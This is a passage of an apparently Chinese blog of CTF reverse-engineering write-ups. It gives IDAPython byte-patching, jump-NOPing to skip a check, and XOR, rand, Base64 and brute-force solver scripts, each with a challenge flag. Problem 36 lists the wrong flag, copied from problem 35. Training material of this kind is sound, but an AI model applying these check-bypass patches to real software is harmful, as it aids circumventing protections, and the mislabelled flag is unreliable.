start="4"><li>IDAPython批量修复脚本</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">start = 0x1144</span><br><span class="line">end = 0x3100</span><br><span class="line"></span><br><span class="line">for i in range(start, end):</span><br><span class="line">    if get_wide_byte(i) == 0xEB and get_wide_byte(i+1) == 0xFF:</span><br><span class="line">        patch_byte(i, 0x90)  # 仅修改EB为90</span><br><span class="line">        # patch_byte(i+1, 0x90)  # 可选修复FF</span><br></pre></td></tr></tbody></table></figure><ol start="5"><li>两种解题路径</li></ol><p><strong>方法A：完整反编译</strong></p><ol><li>修复后按<code>P</code>创建函数</li><li><code>F5</code>生成伪代码</li><li>提取所有<code>putchar()</code>参数拼接flag</li></ol><p><strong>方法B：非预期解</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># 修改初始判断条件</span><br><span class="line">mov dword ptr [rbp-4], 0  → 改为1</span><br><span class="line"># 或NOP掉关键跳转</span><br><span class="line">jz short loc_xxxx  → 改为90 90</span><br></pre></td></tr></tbody></table></figure><ol start="6"><li>注意事项</li></ol><ul><li>显示操作码字节（Options -&gt; General -&gt; Disassembly）</li><li>花指令可能多层嵌套，需反复验证</li></ul><p>原始输出：<code>GF�CTF{u_are2wordy}</code><br>修正格式：<code>NSSCTF{u_are2wordy}</code></p><p>核心是通过特征码识别+批量修补恢复原始逻辑。</p><hr><h2 id="32-NISACTF-2022-string"><a href="#32-NISACTF-2022-string" class="headerlink" title="32 [NISACTF 2022]string"></a>32 [NISACTF 2022]string</h2><p>🚩flag：<code>NSSCTF{5353316611126}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code> <code>动态调试</code></p><p>反编译找到核心代码。</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(“The length of flag is <span class="number">13</span>”);</span><br><span class="line">srand(seed);</span><br><span class="line"><span class="built_in">printf</span>(“NSSCTF{”);</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">13</span>; ++m )</span><br><span class="line">{</span><br><span class="line">v4 = rand();</span><br><span class="line"><span class="built_in">printf</span>(“%d”, (<span class="type">unsigned</span> <span class="type">int</span>)(v4 % <span class="number">8</span> + <span class="number">1</span>));</span><br><span class="line">}</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">125</span>);</span><br></pre></td></tr></tbody></table></figure><p>双击seed:<br>seed dd 2766h ; DATA XREF: flag+133↑r</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> {</span><br><span class="line"><span class="type">int</span> seed = <span class="number">0x2766</span>;</span><br><span class="line"><span class="type">int</span> m;</span><br><span class="line"><span class="type">int</span> v4;</span><br><span class="line"></span><br><span class="line">srand(seed);</span><br><span class="line"><span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">13</span>; ++m ) {</span><br><span class="line">v4 = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v4 % <span class="number">8</span> + <span class="number">1</span>));</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">  gcc exp.c</span><br><span class="line">./a.out</span><br><span class="line">5353316611126%  </span><br></pre></td></tr></tbody></table></figure><hr><h2 id="33-HNCTF-2022-Week1-贝斯是什么乐器啊？"><a href="#33-HNCTF-2022-Week1-贝斯是什么乐器啊？" class="headerlink" title="33 [HNCTF 2022 Week1]贝斯是什么乐器啊？"></a>33 [HNCTF 2022 Week1]贝斯是什么乐器啊？</h2><p>🚩flag：<code>NSSCTF{B@se64_HAHAHA}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code> <code>动态调试</code></p><p>解题脚本</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">key = “NRQ@PAu;<span class="number">8j</span>[+(R:<span class="number">2806.</span>i”</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">s.append(<span class="built_in">ord</span>(i))</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">s[i] = s[i]+i</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(s[i]),end=‘’)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>b‘NRQ@PAu;8j[+(R:2806.i’<br>[78, 82, 81, 64, 80, 65, 117, 59, 56, 106, 91, 43, 40, 82, 58, 50, 56, 48, 54, 46, 105]<br>NSSCTF{B@se64_HAHAHA}</p></blockquote><hr><h2 id="34-UTCTF-2020-Basics-RE"><a href="#34-UTCTF-2020-Basics-RE" class="headerlink" title="34 [UTCTF 2020]Basics(RE)"></a>34 [UTCTF 2020]Basics(RE)</h2><p>🚩flag：<code>NSSCTF{str1ngs_1s_y0ur_fr13nd}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code></p><p>看文件头，改后缀.elf</p><p>使用die确定没有加壳。</p><p>使用ida pro打开，strings到flag。</p><blockquote><p>.rodata:00000000000020C00000001FCutflag{str1ngs_1s_y0ur_fr13nd}</p></blockquote><hr><h2 id="35-NISACTF-2022-sign-ezc"><a href="#35-NISACTF-2022-sign-ezc" class="headerlink" title="35 [NISACTF 2022]sign-ezc++"></a>35 [NISACTF 2022]sign-ezc++</h2><p>🚩flag：<code>NSSCTF{this_is_NISA_re_sign}</code></p><p>💡hint：<code>C</code> <code>逆向技术</code></p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  Man *v3; <span class="comment">// rbx</span></span><br><span class="line">  Human *v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> name; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+37h] [rbp-9h] BYREF</span></span><br><span class="line">  Human *m; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::allocator(&amp;v7);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;name, <span class="string">"NISACTF"</span>, &amp;v7);</span><br><span class="line">  v3 = (Man *)operator new(<span class="number">0x18u</span>LL);</span><br><span class="line">  Man::Man(v3, (<span class="built_in">std</span>::<span class="built_in">string</span>)&amp;name, <span class="number">4</span>);</span><br><span class="line">  m = v3;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(&amp;name);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="type">char</span>&gt;::~allocator(&amp;v7);</span><br><span class="line">  (*((<span class="type">void</span> (__fastcall **)(Human *))m-&gt;_vptr_Human + <span class="number">1</span>))(m);</span><br><span class="line">  v4 = m;</span><br><span class="line">  <span class="keyword">if</span> ( m )</span><br><span class="line">  {</span><br><span class="line">    Human::~Human(m);</span><br><span class="line">    operator <span class="title function_">delete</span><span class="params">(v4)</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>human可疑。</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">Human::give_flag</span><span class="params">(Human *<span class="type">const</span> this)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-54h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    flag[i] ^= <span class="number">0xAu</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>并在内存中发现：</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">.<span class="keyword">data</span>:<span class="number">000000000046</span>A020 flag            db <span class="number">44</span>h, <span class="number">2</span> dup(<span class="number">59</span>h), <span class="number">49</span>h, <span class="number">5</span>Eh, <span class="number">4</span>Ch, <span class="number">71</span>h, <span class="number">7</span>Eh, <span class="number">62</span>h, <span class="number">63</span>h</span><br><span class="line">.<span class="keyword">data</span>:<span class="number">000000000046</span>A020                                         ; <span class="keyword">DATA</span> XREF: Human::give_flag(void)+<span class="number">21</span>↑o</span><br><span class="line">.<span class="keyword">data</span>:<span class="number">000000000046</span>A020                                         ; Human::give_flag(void)+<span class="number">37</span>↑o ...</span><br><span class="line">.<span class="keyword">data</span>:<span class="number">000000000046</span>A020                 db <span class="number">79</span>h, <span class="number">55</span>h, <span class="number">63</span>h, <span class="number">79</span>h, <span class="number">55</span>h, <span class="number">44</span>h, <span class="number">43</span>h, <span class="number">59</span>h, <span class="number">4</span>Bh, <span class="number">55</span>h, <span class="number">78</span>h</span><br><span class="line">.<span class="keyword">data</span>:<span class="number">000000000046</span>A020                 db <span class="number">6</span>Fh, <span class="number">55</span>h, <span class="number">79</span>h, <span class="number">63</span>h, <span class="number">6</span>Dh, <span class="number">64</span>h, <span class="number">77</span>h, <span class="number">14</span>h dup(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure><p>写脚本解密：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">s=[<span class="number">0x44</span>,<span class="number">0x59</span>,<span class="number">0x59</span>,<span class="number">0x49</span>,<span class="number">0x5E</span>,<span class="number">0x4C</span>,<span class="number">0x71</span>,<span class="number">0x7E</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x79</span>,<span class="number">0x55</span>,<span class="number">0x63</span>,<span class="number">0x79</span>,<span class="number">0x55</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0x59</span>,<span class="number">0x4B</span>,<span class="number">0x55</span>,<span class="number">0x78</span>,<span class="number">0x6F</span>,<span class="number">0x55</span>,<span class="number">0x79</span>,<span class="number">0x63</span>,<span class="number">0x6D</span>,<span class="number">0x64</span>,<span class="number">0x77</span>,<span class="number">0x14</span>]</span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(letter^<span class="number">0xA</span>),end=<span class="string">""</span>)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>NSSCTF{this_is_NISA_re_sign}</p></blockquote><h2 id="36-NSSCTF-2022-Spring-Recruit-easy-Python"><a href="#36-NSSCTF-2022-Spring-Recruit-easy-Python" class="headerlink" title="36 [NSSCTF 2022 Spring Recruit]easy Python"></a>36 [NSSCTF 2022 Spring Recruit]easy Python</h2><p>🚩flag：<code>NSSCTF{this_is_NISA_re_sign}</code></p><p>💡hint：<code>Base64</code> <code>Python</code> <code>算法分析</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string,string2</span>):</span><br><span class="line">    tmp_str = <span class="built_in">str</span>()</span><br><span class="line">    ret = <span class="built_in">str</span>()</span><br><span class="line">    bit_string_str = string.encode()</span><br><span class="line">    remain = <span class="built_in">len</span>( string ) % <span class="number">3</span></span><br><span class="line">    remain_str = <span class="built_in">str</span>()</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> bit_string_str:</span><br><span class="line">        b_char = (<span class="built_in">bin</span>(char)[<span class="number">2</span>:])</span><br><span class="line">        b_char = <span class="string">'0'</span>*(<span class="number">8</span>-<span class="built_in">len</span>(b_char)) + b_char</span><br><span class="line">        tmp_str += b_char</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_str)//<span class="number">6</span>):</span><br><span class="line">        temp_nub = <span class="built_in">int</span>(tmp_str[i*<span class="number">6</span>:<span class="number">6</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub]</span><br><span class="line">    <span class="keyword">if</span> remain==<span class="number">2</span>:</span><br><span class="line">        remain_str = tmp_str[-<span class="number">4</span>:] + <span class="string">'0'</span>*<span class="number">2</span></span><br><span class="line">        temp_nub = <span class="built_in">int</span>(remain_str,<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub] + <span class="string">"="</span></span><br><span class="line">    <span class="keyword">elif</span> remain==<span class="number">1</span>:</span><br><span class="line">        remain_str = tmp_str[-<span class="number">2</span>:] + <span class="string">'0'</span>*<span class="number">4</span></span><br><span class="line">        temp_nub = <span class="built_in">int</span>(remain_str,<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub] + <span class="string">"="</span>*<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> ret.replace(<span class="string">"="</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">res = encode(<span class="built_in">input</span>(),string.ascii_uppercase+string.ascii_lowercase+string.digits+<span class="string">'+/'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res == <span class="string">"TlNTQ1RGe2Jhc2U2NCEhfQ"</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"good!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"bad!"</span>)</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">encoded_str, alphabet</span>):</span><br><span class="line">    <span class="comment"># 计算需要添加的填充字符</span></span><br><span class="line">    padding = <span class="number">4</span> - (<span class="built_in">len</span>(encoded_str) % <span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> padding != <span class="number">4</span>:</span><br><span class="line">        encoded_str += <span class="string">'='</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建字符到索引的映射</span></span><br><span class="line">    char_to_index = {c: i <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(alphabet)}</span><br><span class="line">    char_to_index[<span class="string">'='</span>] = <span class="number">0</span>  <span class="comment"># 填充字符处理</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将每个字符转换为6位二进制</span></span><br><span class="line">    binary_str = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> encoded_str:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> char_to_index:</span><br><span class="line">            binary_str += <span class="string">f"<span class="subst">{char_to_index[char]:06b}</span>"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按8位分割二进制字符串</span></span><br><span class="line">    bytes_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>):</span><br><span class="line">        byte = binary_str[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">8</span>:</span><br><span class="line">            bytes_list.append(<span class="built_in">int</span>(byte, <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 转换为字节并解码</span></span><br><span class="line">    decoded_bytes = <span class="built_in">bytes</span>(bytes_list)</span><br><span class="line">    <span class="keyword">return</span> decoded_bytes.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试解码</span></span><br><span class="line">alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">'+/'</span></span><br><span class="line">encoded_flag = <span class="string">"TlNTQ1RGe2Jhc2U2NCEhfQ"</span></span><br><span class="line">decoded_flag = decode(encoded_flag, alphabet)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"解码结果:"</span>, decoded_flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">string, string2</span>):</span><br><span class="line">    tmp_str = <span class="built_in">str</span>()</span><br><span class="line">    ret = <span class="built_in">str</span>()</span><br><span class="line">    bit_string_str = string.encode()</span><br><span class="line">    remain = <span class="built_in">len</span>(string) % <span class="number">3</span></span><br><span class="line">    remain_str = <span class="built_in">str</span>()</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> bit_string_str:</span><br><span class="line">        b_char = (<span class="built_in">bin</span>(char)[<span class="number">2</span>:])</span><br><span class="line">        b_char = <span class="string">'0'</span>*(<span class="number">8</span>-<span class="built_in">len</span>(b_char)) + b_char</span><br><span class="line">        tmp_str += b_char</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp_str)//<span class="number">6</span>):</span><br><span class="line">        temp_nub = <span class="built_in">int</span>(tmp_str[i*<span class="number">6</span>:<span class="number">6</span>*(i+<span class="number">1</span>)],<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub]</span><br><span class="line">    <span class="keyword">if</span> remain == <span class="number">2</span>:</span><br><span class="line">        remain_str = tmp_str[-<span class="number">4</span>:] + <span class="string">'0'</span>*<span class="number">2</span></span><br><span class="line">        temp_nub = <span class="built_in">int</span>(remain_str,<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub] + <span class="string">"="</span></span><br><span class="line">    <span class="keyword">elif</span> remain == <span class="number">1</span>:</span><br><span class="line">        remain_str = tmp_str[-<span class="number">2</span>:] + <span class="string">'0'</span>*<span class="number">4</span></span><br><span class="line">        temp_nub = <span class="built_in">int</span>(remain_str,<span class="number">2</span>)</span><br><span class="line">        ret += string2[temp_nub] + <span class="string">"="</span>*<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> ret.replace(<span class="string">"="</span>, <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证解码是否正确</span></span><br><span class="line">test_input = <span class="string">"NSSCTF{base64!!}"</span></span><br><span class="line">encoded = encode(test_input, alphabet)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"编码验证:"</span>, encoded == encoded_flag)  <span class="comment"># 应该输出True</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="37-HNCTF-2022-Week1-你知道什么是Py嘛？"><a href="#37-HNCTF-2022-Week1-你知道什么是Py嘛？" class="headerlink" title="37 [HNCTF 2022 Week1]你知道什么是Py嘛？"></a>37 [HNCTF 2022 Week1]你知道什么是Py嘛？</h2><p>🚩flag：<code>NSSCTF{Pyth0n_1s_th3_best_l@nguage}</code></p><p>💡hint：<code>Python</code> <code>XOR</code> <code>逆向技术</code></p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">s = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">"please input your flag:"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr=[<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(s)!=<span class="number">35</span>  <span class="keyword">or</span> s[<span class="number">0</span>]!=<span class="string">'N'</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"error"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">ord</span>(s[i-<span class="number">1</span>])^<span class="built_in">ord</span>(s[i])!=arr[i-<span class="number">1</span>]):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"error!"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"right!"</span>)</span><br></pre></td></tr></tbody></table></figure><p>解题脚本：</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">arr = [<span class="number">29</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">18</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">13</span>, <span class="number">28</span>, <span class="number">88</span>, <span class="number">94</span>, <span class="number">49</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">43</span>, <span class="number">28</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">61</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">7</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">44</span>, <span class="number">46</span>, <span class="number">9</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">24</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知第一个字符是'N'</span></span><br><span class="line">flag = [<span class="string">'N'</span>] * <span class="number">35</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐个计算后续字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">35</span>):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(flag[i-<span class="number">1</span>]) ^ arr[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 组合成完整字符串</span></span><br><span class="line">flag_str = <span class="string">''</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"正确的flag是:"</span>, flag_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证脚本</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) != <span class="number">35</span> <span class="keyword">or</span> flag[<span class="number">0</span>] != <span class="string">'N'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(flag[i-<span class="number">1</span>]) ^ <span class="built_in">ord</span>(flag[i]) != arr[i-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 验证我们找到的flag是否正确</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"验证结果:"</span>, verify(flag_str))</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="38-广东省大学生攻防大赛-2022-pyre"><a href="#38-广东省大学生攻防大赛-2022-pyre" class="headerlink" title="38 [广东省大学生攻防大赛 2022]pyre"></a>38 [广东省大学生攻防大赛 2022]pyre</h2><p>🚩flag：<code>NSSCTF{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}</code></p><p>💡hint：<code>Python</code> <code>PYC</code> <code>逆向技术</code></p><p>反编译，爆破b。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">c = [</span><br><span class="line">    <span class="number">144</span>, <span class="number">163</span>, <span class="number">158</span>, <span class="number">177</span>, <span class="number">121</span>, <span class="number">39</span>, <span class="number">58</span>, <span class="number">58</span>, <span class="number">91</span>, <span class="number">111</span>, <span class="number">25</span>, <span class="number">158</span>, <span class="number">72</span>, <span class="number">53</span>, <span class="number">152</span>, <span class="number">78</span>, <span class="number">171</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">45</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">53</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">111</span>, <span class="number">91</span>, <span class="number">53</span>, <span class="number">152</span>, <span class="number">105</span>, <span class="number">45</span>, <span class="number">152</span>, <span class="number">144</span>, <span class="number">39</span>, <span class="number">171</span>, <span class="number">45</span>, <span class="number">91</span>, <span class="number">78</span>, <span class="number">45</span>, <span class="number">158</span>, <span class="number">8</span></span><br><span class="line">]</span><br><span class="line">max_b = <span class="number">200</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_b):</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> j*<span class="number">33</span> % b == c[i]:</span><br><span class="line">                tmp.append(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp) == <span class="built_in">len</span>(c):</span><br><span class="line">        res.append(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">''</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> r]))</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><blockquote><p>flag{2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca}</p></blockquote><hr><h2 id="39-GDOUCTF-2023-Tea"><a href="#39-GDOUCTF-2023-Tea" class="headerlink" title="39 [GDOUCTF 2023]Tea"></a>39 [GDOUCTF 2023]Tea</h2><p>🚩flag：<code>NSSCTF{hzCtf_94_re666fingcry5641qq}</code></p><p>💡hint：<code>TEA</code> <code>XTEA</code> <code>动态调试</code></p><p>解压是个exe文件，没有加壳。</p><p>在 ida 使用快捷键 shift+f12打开字符串窗口搜索关键字 flag</p><p>双击进入，然后一直点击快捷键 <strong>x</strong> 找到调用处，分析关键代码</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">10</span>; ++j )</span><br><span class="line">   <span class="comment">// 输入函数，scanf</span></span><br><span class="line">   sub_1400111FE(<span class="string">"%x"</span>, &amp;v8[j]);</span><br><span class="line"> <span class="comment">// v7重新赋值</span></span><br><span class="line"> sub_140011339(v7);</span><br><span class="line"> <span class="comment">// v8备份到v9</span></span><br><span class="line"> sub_140011145(v8, v9);</span><br><span class="line"> <span class="comment">// v7为key，v8为输入的值，进行tea加密</span></span><br><span class="line"> sub_1400112B7(v8, v7);</span><br><span class="line"> <span class="comment">// 验证加密的结果是否符合预期</span></span><br><span class="line"> v6 = sub_140011352(v8);</span><br><span class="line"> <span class="keyword">if</span> ( v6 )</span><br><span class="line"> {</span><br><span class="line">   <span class="comment">// sub_140011195 为打印函数</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"you are right\n"</span>);</span><br><span class="line">   <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">10</span>; ++k )</span><br><span class="line">   {</span><br><span class="line">     <span class="keyword">for</span> ( m = <span class="number">3</span>; m &gt;= <span class="number">0</span>; --m )</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, (v9[k] &gt;&gt; (<span class="number">8</span> * m)));</span><br><span class="line">   }</span><br><span class="line"> }</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> {</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"fault!\nYou can go online and learn the tea algorithm!"</span>);</span><br><span class="line"> }</span><br></pre></td></tr></tbody></table></figure><p>进入 sub_1400117D0函数，可以看到， key的值修改为 [2233, 4455, 6677, 8899]</p><p>进入 sub_140011900 函数，可以看到是Tea加密</p><blockquote><p>TEA（Tiny Encryption Algorithm）是一种轻量级的对称加密算法，由David Wheeler和Roger 